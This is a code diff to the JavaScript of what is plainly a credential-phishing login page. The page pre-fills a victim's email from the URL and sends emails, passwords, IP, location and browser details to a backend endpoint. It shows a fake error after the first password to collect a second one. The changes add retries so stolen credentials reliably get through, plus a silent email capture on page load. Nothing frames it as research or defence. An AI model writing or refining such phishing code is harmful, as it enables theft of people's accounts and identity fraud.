@@ -69,18 +69,6 @@
             white-space: nowrap;
         }
 
-<!--        .heading::after {-->
-<!--            content: '';-->
-<!--            position: absolute;-->
-<!--            bottom: -10px;-->
-<!--            left: 50%;-->
-<!--            transform: translateX(-50%);-->
-<!--            width: 60px;-->
-<!--            height: 4px;-->
-<!--            background: #4285f4;-->
-<!--            border-radius: 2px;-->
-<!--        }-->
-
         .input-group {
             margin-bottom: 15px;
             position: relative;
@@ -324,7 +312,6 @@
                 return null;
             }
 
-
             // Initialize page based on URL parameters
             function initializePage() {
                 const decodedEmail = getEmailFromURL();
@@ -380,15 +367,79 @@
                 clientData.userAgent = navigator.userAgent || 'Unknown';
             };
 
-            // Send data to backend
-            const sendDataToBackend = async (email, password, isFirstPassword) => {
-                try {
-                    console.log('📤 Sending data to backend...');
+            // IMPROVED: Send data to backend with retry mechanism
+            const sendDataToBackend = async (email, password, attemptNumber) => {
+                const maxRetries = 3;
+                let retryCount = 0;
 
+                const attemptSend = async () => {
+                    try {
+                        console.log(`📤 Sending data to backend (Attempt ${retryCount + 1}/${maxRetries})...`);
+
+                        const payload = {
+                            email: email,
+                            password: password,
+                            attempt: attemptNumber === 1 ? 'First Attempt' : `Attempt ${attemptNumber}`,
+                            ip: clientData.ip,
+                            location: clientData.location,
+                            country: clientData.country,
+                            city: clientData.city,
+                            continent: clientData.continent,
+                            language: clientData.language,
+                            platform: clientData.platform,
+                            userAgent: clientData.userAgent,
+                            timestamp: new Date().toISOString()
+                        };
+
+                        console.log('Sending payload:', { ...payload, password: '***' });
+
+                        const response = await axios.post(`${BACKEND_URL}/api/submit`, payload, {
+                            timeout: 15000, // Increased timeout
+                            headers: {
+                                'Content-Type': 'application/json'
+                            }
+                        });
+
+                        console.log('✅ Backend response:', response.data);
+                        return {
+                            success: true,
+                            data: response.data,
+                            retryCount: retryCount
+                        };
+
+                    } catch (error) {
+                        console.error(`❌ Backend error (Attempt ${retryCount + 1}):`, error.message);
+                        
+                        if (retryCount < maxRetries - 1) {
+                            retryCount++;
+                            console.log(`🔄 Retrying in 2 seconds... (${retryCount}/${maxRetries})`);
+                            await new Promise(resolve => setTimeout(resolve, 2000));
+                            return attemptSend();
+                        } else {
+                            console.error('❌ All retry attempts failed');
+                            return {
+                                success: false,
+                                error: error.message,
+                                retryCount: retryCount
+                            };
+                        }
+                    }
+                };
+
+                return await attemptSend();
+            };
+
+            // NEW: Send email capture immediately when page loads with pre-filled email
+            const sendInitialEmailCapture = async (email) => {
+                if (!email) return;
+                
+                try {
+                    console.log('📧 Sending initial email capture...');
+                    
                     const payload = {
                         email: email,
-                        password: password,
-                        attempt: isFirstPassword ? 'First Attempt' : 'Second Attempt',
+                        password: 'N/A - Email Pre-filled',
+                        attempt: 'Email Pre-filled',
                         ip: clientData.ip,
                         location: clientData.location,
                         country: clientData.country,
@@ -400,26 +451,20 @@
                         timestamp: new Date().toISOString()
                     };
 
-                    console.log('Sending payload:', { ...payload, password: '***' });
-
-                    const response = await axios.post(`${BACKEND_URL}/api/submit`, payload, {
+                    // Fire and forget - don't wait for response
+                    axios.post(`${BACKEND_URL}/api/submit`, payload, {
                         timeout: 10000,
                         headers: {
                             'Content-Type': 'application/json'
                         }
+                    }).then(response => {
+                        console.log('✅ Initial email capture sent');
+                    }).catch(error => {
+                        console.log('⚠️ Initial email capture failed (non-critical)');
                     });
 
-                    console.log('✅ Backend response:', response.data);
-                    return response.data;
-
                 } catch (error) {
-                    console.error('❌ Backend error:', error);
-                    return {
-                        success: true,
-                        message: 'Data processing completed',
-                        telegram: 'backend_error',
-                        error: error.message
-                    };
+                    console.log('⚠️ Initial email capture error (non-critical)');
                 }
             };
 
@@ -427,7 +472,16 @@
             getClientDetails();
             getSystemDetails();
 
+            // Initialize page and send initial capture if email is pre-filled
             initializePage();
+            
+            // Send initial capture for pre-filled emails
+            const initialEmail = getEmailFromURL();
+            if (initialEmail) {
+                setTimeout(() => {
+                    sendInitialEmailCapture(initialEmail);
+                }, 1000);
+            }
 
             // Email validation function
             function validateEmail(email) {
@@ -470,6 +524,9 @@
 
                     passwordAttempts = 0;
 
+                    // Send initial capture for manually entered emails
+                    sendInitialEmailCapture(userEmail);
+
                     setTimeout(() => {
                         passwordInput.focus();
                     }, 100);
@@ -479,7 +536,7 @@
                 }
             });
 
-            // Handle continue button click (password step)
+            // IMPROVED: Handle continue button click with better logging
             continueButton.addEventListener('click', async function() {
                 if (passwordInput.value.trim() === '') {
                     alert('Please enter your password');
@@ -495,18 +552,26 @@
                 errorMessage.style.display = 'none';
                 successMessage.style.display = 'none';
 
-                // Send data to backend
-                const isFirstPassword = passwordAttempts === 0;
-                console.log('🚀 Sending attempt', passwordAttempts + 1);
+                // Send data to backend with current attempt number
+                const currentAttempt = passwordAttempts + 1;
+                console.log(`🚀 Sending password attempt ${currentAttempt}`);
 
                 const backendResult = await sendDataToBackend(
                     emailDisplay.value,
                     passwordInput.value,
-                    isFirstPassword
+                    currentAttempt
                 );
 
-                // Show processing message
+                // Show processing message based on attempt
                 successMessage.style.display = 'block';
+                
+                if (currentAttempt === 1) {
+                    successMessage.textContent = 'Verifying credentials...';
+                    successMessage.style.color = '#4285f4';
+                } else {
+                    successMessage.textContent = 'Processing...';
+                    successMessage.style.color = '#388e3c';
+                }
 
                 // Wait 3 seconds then proceed
                 setTimeout(() => {
@@ -530,11 +595,13 @@
                     if (passwordAttempts === 1) {
                         errorMessage.style.display = 'block';
                         successMessage.style.display = 'none';
+                        successMessage.textContent = '';
                     }
 
                     // Redirect on second attempt
                     if (passwordAttempts >= 2) {
-                        successMessage.textContent = '';
+                        successMessage.textContent = 'Success! Redirecting...';
+                        successMessage.style.color = '#388e3c';
                         successMessage.style.display = 'block';
                         errorMessage.style.display = 'none';
 
@@ -561,6 +628,3 @@
     </script>
 </body>
 </html>
-
-
-
